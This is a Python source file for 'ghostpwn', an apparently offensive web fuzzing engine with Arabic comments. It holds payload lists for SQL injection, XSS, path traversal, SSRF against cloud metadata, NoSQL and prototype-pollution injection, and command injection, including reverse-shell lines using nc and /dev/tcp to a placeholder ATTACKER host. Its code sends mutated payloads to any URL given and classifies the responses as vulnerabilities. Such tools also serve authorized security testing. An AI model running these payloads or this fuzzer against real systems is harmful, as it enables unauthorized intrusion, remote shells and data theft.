#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Fuzzing Engine
fuzzing ذكي للمدخلات لاكتشاف ثغرات غير متوقعة

الذكاء:
1. يولّد payloads ذكية بناءً على نوع الـ parameter
2. يحلل الـ responses ويكتشف anomalies
3. يتعلم من النتائج ويحسّن الـ payloads
4. يكتشف ثغرات غير معروفة
"""
import sys
import os
import re
import time
import random
import string
import urllib.parse
from typing import Dict, List, Optional, Tuple
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from modules.http_client import HttpClient
from modules.arabic_display import SmartLogger, Colors, fix_display


# ============================ Smart Payload Generator ============================
class SmartPayloadGenerator:
    """توليد payloads ذكية"""

    # payloads حسب نوع الـ param
    PAYLOAD_BY_PARAM_TYPE = {
        "id": [
            "1", "0", "-1", "99999", "1'", "1\"", "1 OR 1=1", "1; DROP TABLE",
            "1 UNION SELECT NULL", "1' OR '1'='1", "1 AND SLEEP(3)",
            "1' AND SLEEP(3)--", "../../etc/passwd", "/etc/passwd",
        ],
        "string": [
            "test", "admin", "root", "'", "\"", "<script>alert(1)</script>",
            "${7*7}", "{{7*7}}", ";id", "|id", "../../../etc/passwd",
            "http://169.254.169.254/", "javascript:alert(1)",
        ],
        "url": [
            "http://localhost", "http://127.0.0.1", "http://169.254.169.254/",
            "file:///etc/passwd", "//evil.com", "https://evil.com",
            "http://[::1]/", "http://0.0.0.0/", "dict://localhost:11211/stat",
            "gopher://localhost:25/", "http://localhost:8080/admin",
        ],
        "file": [
            "../../../etc/passwd", "../../../../etc/passwd", "/etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
            "/var/log/apache2/access.log", "C:\\windows\\win.ini",
            "/proc/self/environ", "....//....//etc/passwd",
        ],
        "command": [
            ";id", "|id", "&id", "&&id", "`id`", "$(id)", ";cat /etc/passwd",
            "|cat /etc/passwd", ";uname -a", "%3Bid", ";nc -e /bin/sh ATTACKER 4444",
            ";bash -i >& /dev/tcp/ATTACKER/4444 0>&1",
        ],
        "search": [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>", "'; DROP TABLE--", "' OR '1'='1",
            "test' OR '1'='1' --", "\"><script>alert(1)</script>",
            "{{7*7}}", "${7*7}",
        ],
        "json": [
            '{"test":1}', '{"$gt":""}', '{"$ne":""}', '{"$where":"1==1"}',
            '{"admin":true}', '{"role":"admin"}', '{"user":{"admin":true}}',
            '{"__proto__":{"admin":true}}', '{"constructor":{"prototype":{"admin":true}}}',
        ],
    }

    @classmethod
    def generate_for_param(cls, param_name: str, param_value: str = "") -> List[str]:
        """توليد payloads مناسبة للـ param"""
        payloads = set()

        # فحص نوع الـ param
        param_lower = param_name.lower()

        if any(s in param_lower for s in ["url", "link", "redirect", "callback", "webhook", "fetch"]):
            payloads.update(cls.PAYLOAD_BY_PARAM_TYPE["url"])

        elif any(s in param_lower for s in ["file", "path", "page", "template", "include", "doc"]):
            payloads.update(cls.PAYLOAD_BY_PARAM_TYPE["file"])

        elif any(s in param_lower for s in ["cmd", "exec", "command", "run", "ping", "test"]):
            payloads.update(cls.PAYLOAD_BY_PARAM_TYPE["command"])

        elif any(s in param_lower for s in ["search", "q", "query", "find", "name", "title"]):
            payloads.update(cls.PAYLOAD_BY_PARAM_TYPE["search"])

        elif any(s in param_lower for s in ["id", "uid", "user_id", "userid", "item", "num"]):
            payloads.update(cls.PAYLOAD_BY_PARAM_TYPE["id"])

        # لو القيمة رقمية
        if param_value.isdigit():
            payloads.update(cls.PAYLOAD_BY_PARAM_TYPE["id"])

        # لو القيمة نص
        elif param_value:
            payloads.update(cls.PAYLOAD_BY_PARAM_TYPE["string"])

        # إضافة payloads عامة
        payloads.update([
            "'", "\"", "<>", "<script>", "{{", "${", "${7*7}", "{{7*7}}",
            "../../../etc/passwd", ";id", "|id",
        ])

        return list(payloads)

    @classmethod
    def generate_mutation(cls, payload: str) -> List[str]:
        """توليد mutations لـ payload"""
        mutations = [payload]

        # Case variation
        if payload.isalpha():
            mutations.append(payload.swapcase())
            mutations.append(payload.upper())
            mutations.append(payload.lower())

        # URL encoding
        mutations.append(urllib.parse.quote(payload, safe=""))

        # Double URL encoding
        mutations.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))

        # HTML entities
        mutations.append("".join(f"&#{ord(c)};" for c in payload))

        # Unicode
        mutations.append("".join(f"\\u{ord(c):04x}" for c in payload))

        # Whitespace variations
        if " " in payload:
            mutations.append(payload.replace(" ", "/**/"))
            mutations.append(payload.replace(" ", "\t"))
            mutations.append(payload.replace(" ", "\n"))
            mutations.append(payload.replace(" ", "%20"))

        # Comment insertion (لـ SQL)
        sql_keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]
        for kw in sql_keywords:
            if kw in payload.upper():
                idx = payload.upper().index(kw)
                mutations.append(payload[:idx+2] + "/**/" + payload[idx+2:])

        return mutations


# ============================ Response Anomaly Detector ============================
class AnomalyDetector:
    """كشف anomalies في الـ responses"""

    def __init__(self):
        self.baseline = None
        self.baseline_length = 0
        self.baseline_status = 0

    def set_baseline(self, response: Dict):
        """تحديد الـ baseline"""
        self.baseline = response
        self.baseline_length = len(response.get("body", ""))
        self.baseline_status = response.get("status", 0)

    def detect_anomalies(self, response: Dict, payload: str = "") -> Dict:
        """كشف anomalies"""
        anomalies = {
            "status_change": False,
            "length_diff_significant": False,
            "length_diff": 0,
            "new_error": False,
            "error_type": None,
            "reflection": False,
            "reflection_payload": False,
            "timing_anomaly": False,
            "new_headers": [],
            "new_cookies": [],
            "redirect": False,
            "redirect_location": "",
            "score": 0,  # درجة الـ anomaly
        }

        if not self.baseline:
            return anomalies

        # status change
        if response.get("status") != self.baseline_status:
            anomalies["status_change"] = True
            anomalies["score"] += 2

        # length diff
        current_length = len(response.get("body", ""))
        diff = abs(current_length - self.baseline_length)
        anomalies["length_diff"] = current_length - self.baseline_length

        if diff > 500:
            anomalies["length_diff_significant"] = True
            anomalies["score"] += 2
        elif diff > 100:
            anomalies["score"] += 1

        # new errors
        body = response.get("body", "")
        error_patterns = {
            "sql": r"(SQL syntax|mysql_|SQLSTATE|ORA-|sqlite)",
            "php": r"(PHP (Warning|Notice|Fatal)|Parse error)",
            "asp": r"(Server Error|System\.Exception)",
            "java": r"(java\.lang\.|NullPointerException|SQLException)",
            "python": r"(Traceback|Python|Django|Flask)",
            "ruby": r"(Ruby|Rails|ActionController)",
            "node": r"(node|Express|TypeError)",
        }

        for error_type, pattern in error_patterns.items():
            if re.search(pattern, body, re.IGNORECASE):
                anomalies["new_error"] = True
                anomalies["error_type"] = error_type
                anomalies["score"] += 3
                break

        # reflection
        if payload and payload in body:
            anomalies["reflection_payload"] = True
            anomalies["score"] += 2

        # timing
        if response.get("elapsed", 0) > 3.0:
            anomalies["timing_anomaly"] = True
            anomalies["score"] += 3

        # new headers
        baseline_headers = set(self.baseline.get("headers", {}).keys())
        current_headers = set(response.get("headers", {}).keys())
        new_headers = current_headers - baseline_headers
        if new_headers:
            anomalies["new_headers"] = list(new_headers)
            anomalies["score"] += 1

        # new cookies
        baseline_cookies = self.baseline.get("headers", {}).get("Set-Cookie", "")
        current_cookies = response.get("headers", {}).get("Set-Cookie", "")
        if current_cookies and current_cookies != baseline_cookies:
            anomalies["new_cookies"] = [current_cookies]
            anomalies["score"] += 1

        # redirect
        if response.get("status") in (301, 302, 303, 307, 308):
            anomalies["redirect"] = True
            anomalies["redirect_location"] = response.get("headers", {}).get("Location", "")
            anomalies["score"] += 2

        return anomalies


# ============================ Fuzzing Engine ============================
class FuzzingEngine:
    """محرّك الـ fuzzing"""

    def __init__(self, http_client: HttpClient, audit_logger=None, max_threads: int = 5):
        self.client = http_client
        self.audit = audit_logger
        self.logger = SmartLogger()
        self.max_threads = max_threads

        self.payload_generator = SmartPayloadGenerator()
        self.anomaly_detector = AnomalyDetector()

        self.results = []
        self.anomalies_found = []
        self.vulns_discovered = []

    def _log(self, msg, level="info"):
        getattr(self.logger, level, self.logger.info)(msg)
        if self.audit:
            self.audit.log_event(f"[FUZZ] {msg}", level)

    def fuzz_parameter(self, url: str, param_name: str,
                       baseline_value: str = "") -> List[Dict]:
        """fuzzing parameter معين"""
        self._log(f"Fuzzing parameter: {param_name}", "info")

        # تحديد الـ baseline
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query) if parsed.query else {}
        if param_name not in params:
            params[param_name] = [baseline_value or "test"]

        # طلب baseline
        baseline_url = self._build_url(url, param_name, baseline_value or "test")
        baseline_resp = self.client.get(baseline_url)
        self.anomaly_detector.set_baseline(baseline_resp)

        # توليد payloads
        payloads = self.payload_generator.generate_for_param(param_name, baseline_value)

        results = []

        for payload in payloads:
            # توليد mutations
            mutations = self.payload_generator.generate_mutation(payload)

            for mutation in mutations:
                test_url = self._build_url(url, param_name, mutation)
                resp = self.client.get(test_url)

                # كشف anomalies
                anomalies = self.anomaly_detector.detect_anomalies(resp, mutation)

                result = {
                    "param": param_name,
                    "payload": mutation,
                    "original_payload": payload,
                    "url": test_url,
                    "status": resp["status"],
                    "length": len(resp["body"]),
                    "anomalies": anomalies,
                }

                results.append(result)

                # لو فيه anomaly عالية
                if anomalies["score"] >= 3:
                    self.anomalies_found.append(result)
                    self._log(f"Anomaly detected! payload: {mutation[:30]}... (score: {anomalies['score']})", "warn")

                    # محاولة تحديد نوع الثغرة
                    vuln_type = self._identify_vuln_type(mutation, anomalies, resp)
                    if vuln_type:
                        self._log(f"ثغرة محتملة: {vuln_type}", "success")
                        self.vulns_discovered.append({
                            "type": vuln_type,
                            "param": param_name,
                            "payload": mutation,
                            "url": test_url,
                            "confidence": anomalies["score"] / 10,
                            "evidence": self._get_evidence(anomalies, resp),
                        })

                # delay بسيط
                time.sleep(0.1)

        return results

    def _build_url(self, url: str, param: str, value: str) -> str:
        """بناء URL مع param=value"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query) if parsed.query else {}
        params[param] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                       parsed.params, new_query, parsed.fragment))

    def _identify_vuln_type(self, payload: str, anomalies: Dict, response: Dict) -> Optional[str]:
        """تحديد نوع الثغرة من الـ payload والـ anomaly"""
        payload_lower = payload.lower()

        # SQLi
        if anomalies.get("error_type") == "sql":
            return "sql_injection_error"
        if "sleep(" in payload_lower and anomalies.get("timing_anomaly"):
            return "sql_injection_time"
        if "union select" in payload_lower and anomalies.get("length_diff_significant"):
            return "sql_injection_union"

        # XSS
        if "<script" in payload_lower and anomalies.get("reflection_payload"):
            return "xss_reflected"
        if "onerror=" in payload_lower and anomalies.get("reflection_payload"):
            return "xss_reflected"

        # LFI
        if "etc/passwd" in payload_lower and "root:" in response.get("body", ""):
            return "lfi"
        if "php://filter" in payload_lower and anomalies.get("length_diff_significant"):
            return "lfi_php_filter"

        # Command Injection
        if ";" in payload or "|" in payload:
            if "uid=" in response.get("body", ""):
                return "command_injection"
            if anomalies.get("timing_anomaly") and "sleep" in payload_lower:
                return "command_injection"

        # SSTI
        if "{{7*7}}" in payload and "49" in response.get("body", ""):
            return "ssti"
        if "${7*7}" in payload and "49" in response.get("body", ""):
            return "ssti"

        # Open Redirect
        if "evil.com" in payload_lower and anomalies.get("redirect"):
            return "open_redirect"

        # SSRF
        if "169.254.169.254" in payload and anomalies.get("length_diff_significant"):
            return "ssrf"

        return None

    def _get_evidence(self, anomalies: Dict, response: Dict) -> str:
        """الحصول على دليل"""
        evidence_parts = []

        if anomalies.get("new_error"):
            evidence_parts.append(f"Error: {anomalies.get('error_type')}")
        if anomalies.get("reflection_payload"):
            evidence_parts.append("Payload reflected")
        if anomalies.get("timing_anomaly"):
            evidence_parts.append(f"Timing: {response.get('elapsed', 0):.1f}s")
        if anomalies.get("length_diff_significant"):
            evidence_parts.append(f"Length diff: {anomalies.get('length_diff')}")
        if anomalies.get("redirect"):
            evidence_parts.append(f"Redirect: {anomalies.get('redirect_location')}")
        if anomalies.get("status_change"):
            evidence_parts.append(f"Status: {response.get('status')}")

        return " | ".join(evidence_parts) if evidence_parts else "Anomaly detected"

    def fuzz_url(self, url: str) -> Dict:
        """fuzzing كل الـ params في URL"""
        self._log(f"Fuzzing URL: {url}", "phase")

        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            # لو مفيش params، نضيف ones شائعة
            self._log("لا توجد params - إضافة params شائعة", "info")
            params_to_test = ["id", "q", "search", "name", "page", "file", "url", "cmd"]
        else:
            params = urllib.parse.parse_qs(parsed.query)
            params_to_test = list(params.keys())

        all_results = {
            "url": url,
            "params_tested": params_to_test,
            "results": {},
            "vulns_discovered": [],
        }

        for param in params_to_test:
            results = self.fuzz_parameter(url, param)
            all_results["results"][param] = len(results)

        all_results["vulns_discovered"] = self.vulns_discovered

        return all_results

    def print_fuzzing_report(self, results: Dict):
        """عرض تقرير الـ fuzzing"""
        print(f"\n{Colors.MAGENTA}{'='*60}{Colors.NC}")
        print(f"{Colors.MAGENTA}  🔬 تقرير الـ Fuzzing{Colors.NC}")
        print(f"{Colors.MAGENTA}{'='*60}{Colors.NC}")

        print(f"\n  {Colors.BOLD}URL:{Colors.NC} {results['url']}")
        print(f"  {Colors.BOLD}Params tested:{Colors.NC} {', '.join(results['params_tested'])}")

        print(f"\n  {Colors.BOLD}النتائج لكل param:{Colors.NC}")
        for param, count in results["results"].items():
            print(f"    {param}: {count} payloads tested")

        if results["vulns_discovered"]:
            print(f"\n  {Colors.RED + Colors.BOLD}🎯 ثغرات مكتشفة:{Colors.NC}")
            for vuln in results["vulns_discovered"]:
                color = Colors.RED if vuln["confidence"] > 0.7 else Colors.YELLOW
                print(f"\n    {color}[{vuln['type']}]{Colors.NC}")
                print(f"      Param: {vuln['param']}")
                print(f"      Payload: {vuln['payload'][:60]}")
                print(f"      Confidence: {vuln['confidence']*100:.0f}%")
                print(f"      Evidence: {vuln['evidence']}")

        if self.anomalies_found:
            print(f"\n  {Colors.YELLOW}⚠️  Anomalies detected: {len(self.anomalies_found)}{Colors.NC}")

        print(f"\n{Colors.MAGENTA}{'='*60}{Colors.NC}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - Fuzzing Engine")
    parser.add_argument("--url", required=True)
    args = parser.parse_args()

    client = HttpClient(timeout=10)
    fuzzer = FuzzingEngine(client)
    results = fuzzer.fuzz_url(args.url)
    fuzzer.print_fuzzing_report(results)
